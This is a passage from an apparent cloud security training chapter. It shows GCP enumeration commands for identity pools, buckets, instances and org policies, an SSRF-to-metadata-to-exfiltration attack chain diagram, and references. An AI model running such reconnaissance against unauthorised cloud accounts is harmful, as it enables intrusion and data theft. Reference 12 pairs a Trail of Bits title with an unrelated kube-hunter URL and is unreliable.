# 2. Workload identity pool enumeration
gcloud iam workload-identity-pools list --location=global
gcloud iam workload-identity-pools providers list --workload-identity-pool=<pool-name> --location=global

# 3. Storage bucket enumeration
gsutil ls gs://<bucket-name>
gsutil iam get gs://<bucket-name>

# 4. Compute instance enumeration
gcloud compute instances list --format="table(name,zone,status,machineType)"
gcloud compute instances describe <instance-name> --format="json(serviceAccounts)"

# 5. Organization policy enumeration
gcloud org-policies list --organization=<org-id>
gcloud org-policies describe constraints/compute.disableSerialPortAccess --organization=<org-id>
```

---

## 11. Cross-Platform Attack Path Analysis

### 11.1 Common Cloud Attack Chain

```
SSRF / Web App Vulnerability
         |
         v
Metadata Service (169.254.169.254)
         |
         v
IAM / Managed Identity / Service Account Credentials
         |
         v
Privilege Escalation (IAM enumeration → find overprivileged role)
         |
         v
Lateral Movement (cross-service / cross-account / cross-region)
         |
         v
Persistence (backdoor IAM role, Lambda function, GCP org policy)
         |
         v
Data Exfiltration (S3 / Blob / Storage bucket download)
```

### 11.2 Cross-Reference to Other Tracks

The cloud security track intersects with multiple other tracks:

- **Linux Kernel** (`linux_kernel/docs/`): Hypervisor security depends on kernel isolation. Container security depends on namespace/cgroup primitives. See `02a_vuln_classes.md` for the kernel vulnerability classes that underpin cloud escapes.

- **Zero Day** (`zero_day/docs/`): Hypervisor and cloud service exploits are zero-day attack surfaces. The shared responsibility gap between cloud provider patches and customer action creates zero-day windows. See the zero-day track for exploit development methodology.

- **OSEE** (`OSEE/docs/`): Offensive security engineering for cloud environments requires understanding of both the hypervisor layer and the cloud control plane. The OSEE track covers exploit development that applies to VM escapes and container breakouts.

- **Web Security** (`web_security/docs/`): SSRF to metadata service exploitation is fundamentally a web vulnerability exploited in a cloud context. See the web security track for SSRF exploitation techniques.

- **Supply Chain Security** (`supply_chain_security/docs/`): Container images, Terraform providers, and cloud marketplace AMIs are all supply chain attack vectors that affect cloud environments.

### 11.3 The Fundamental Cloud Security Problem

The fundamental problem in cloud security is that **the trust boundary is not a physical perimeter — it is a policy boundary enforced by software**. A single misconfigured IAM policy, a single missing IMDSv2 enforcement, a single overly broad trust relationship can compromise the entire account. The cloud control plane is the new perimeter, and IAM policies are the new firewall rules.

The shift from "castle-and-moat" to "identity-based perimeter" means that every cloud operation — from launching an instance to reading a secret — goes through an API that is governed by IAM. Understanding the policy evaluation logic, the trust relationships, and the implicit permissions is essential to both attacking and defending cloud environments.

In the following chapters, we will deep-dive into the specific attack and defense techniques for each cloud provider and service model, beginning with Identity and Access Management — the linchpin of cloud security.

---

*Next: [01b — Identity & Access Management](01b_identity_access_management.md)*

---

## References

1. AWS. "Instance Metadata Service v2 (IMDSv2)." *Amazon Web Services*. 2024. https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
2. CVE-2015-3456 (VENOM). NVD. https://nvd.nist.gov/vuln/detail/CVE-2015-3456
3. CVE-2017-17558. NVD. https://nvd.nist.gov/vuln/detail/CVE-2017-17558
4. CVE-2019-5736. NVD. https://nvd.nist.gov/vuln/detail/CVE-2019-5736
5. AWS. "Shared Responsibility Model." *Amazon Web Services*. 2024. https://aws.amazon.com/compliance/shared-responsibility-model/
6. NIST. "SP 800-190: Application Container Security Guide." *National Institute of Standards and Technology*. 2024. https://csrc.nist.gov/publications/detail/sp/800-190/final
7. Microsoft. "Azure Security Architecture." *Microsoft Learn*. 2024. https://learn.microsoft.com/en-us/azure/security/fundamentals/
8. Google Cloud. "Resource Hierarchy and Organization Policies." *Google Cloud*. 2024. https://cloud.google.com/resource-manager/docs/organization-policy/overview
9. MITRE. "ATT&CK Cloud Matrix." *MITRE Corporation*. 2024. https://attack.mitre.org/matrices/enterprise/cloud/
10. Rhino Security Labs. "AWS IAM Privilege Escalation Methods." *Rhino Security Labs*. 2019. https://rhinosecuritylabs.com/aws-privilege-escalation-methods-mitigation/
11. Praetorian. "GCP IAM Enumeration and Privilege Escalation." *Praetorian*. 2021. https://www.praetorian.com/blog/
12. Trail of Bits. "Understanding and Hardening Linux Containers." *Trail of Bits*. 2020. https://github.com/aquasecurity/kube-hunter